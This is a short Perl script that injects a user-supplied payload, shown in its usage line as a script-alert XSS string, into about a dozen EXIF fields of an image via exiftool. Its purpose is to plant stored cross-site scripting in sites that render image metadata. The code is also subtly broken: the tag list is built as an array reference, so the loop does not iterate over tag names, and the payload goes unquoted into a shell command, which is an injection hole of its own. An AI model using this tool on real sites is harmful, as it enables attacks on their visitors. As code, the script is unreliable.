#!/usr/bin/env perl

use 5.010;
use strict;
use warnings;

sub main {
    my $image   = $ARGV[0];
    my $payload = $ARGV[1];

    if ($image && $payload) {
        my @exifs = [
            "ImageDescription",
            "Make",
            "Model",
            "Software",
            "Artist",
            "Copyright",
            "XPTitle",
            "XPComment",
            "XPAuthor",
            "XPSubject",
            "Location",
            "Description",
            "Author"
        ];

        foreach my $exif (@exifs) {
            system ("exiftool -$exif=$payload $image");
        }
        
        exit;
    }

    print "Usage: perl exifs.pl <image.png> '<script>alert('alert');</script>'\n";
}

main();
exit;